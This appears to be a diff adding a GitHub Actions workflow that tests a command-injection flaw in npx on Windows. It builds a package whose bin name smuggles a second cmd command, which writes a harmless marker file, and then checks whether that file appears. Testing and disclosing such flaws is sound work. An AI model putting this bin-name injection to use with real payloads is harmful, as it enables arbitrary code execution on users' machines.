@@ -1,0 +1,25 @@
+name: Test npx bin injection
+on: [push]
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: Create malicious package
+        shell: cmd
+        run: |
+          mkdir pkg
+          echo {"name":"malpkg","version":"1.0.0","bin":{"test^&echo INJECTED_MARKER>MARKER.txt":"./index.js"}} > pkg/package.json
+          echo console.log("hi") > pkg/index.js
+      - name: Run npx
+        shell: cmd
+        run: |
+          npx .\pkg
+          if exist MARKER.txt (echo MARKER_CREATED) else (echo NO_MARKER)
+      - name: Show files
+        shell: cmd
+        run: dir
